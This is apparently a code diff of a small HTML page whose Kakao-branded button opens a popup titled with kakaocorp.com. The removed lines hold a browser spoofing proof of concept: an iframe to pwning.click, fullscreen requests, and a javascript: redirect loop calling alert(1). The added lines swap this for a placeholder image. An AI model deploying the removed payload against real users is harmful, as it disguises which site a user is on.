@@ -1,23 +1,23 @@
 
-
 <img id="button" src="https://t1.kakaocdn.net/kakaocorp/corp_thumbnail/Kakao.png">
 
-
 <script>
-var s="https://kakaocorp.com";
-var button=document.getElementById("button");
-button.href=s;
+var s = "https://kakaocorp.com";
+var button = document.getElementById("button");
+button.href = s;
 var qwin;
-button.onclick=function(e){
+button.onclick = function(e) {
 
-	qwin=open('',"toolbar=no,height=350,width=305");
-	setTimeout(function(){
-		qwin.document.title=s;
-		qwin.document.body.innerHTML=`<iframe src=https://pwning.click/permission.php><meta http-equiv="refresh" content="111;url=https://www.google.com:8000"><button onclick = "document.documentElement.requestFullscreen()">start full screen</button> <embed src=https://permission.site><iframe src="javascript:setInterval(function(){parent.location='javascript:parent.location='https://google.com:8000';alert(1)}, 10)"/></iframe>
-		<embed src=https://permission.site>
-		
-		`;
-		
-	},333)
-return false;}
+    // Open a new window with an image URL
+    qwin = window.open('', "kakaoWindow", "width=800,height=600,scrollbars=yes,resizable=yes,toolbar=no,menubar=no");
+
+    setTimeout(function(){
+        qwin.document.title = s; // Set the title to "https://kakaocorp.com"
+        
+        // Set the body of the new window to display an image
+        qwin.document.body.innerHTML = `<img src="https://via.placeholder.com/800x600" alt="Example Image" style="width:100%;height:auto;">`;
+    }, 333);
+
+    return false;
+}
 </script>
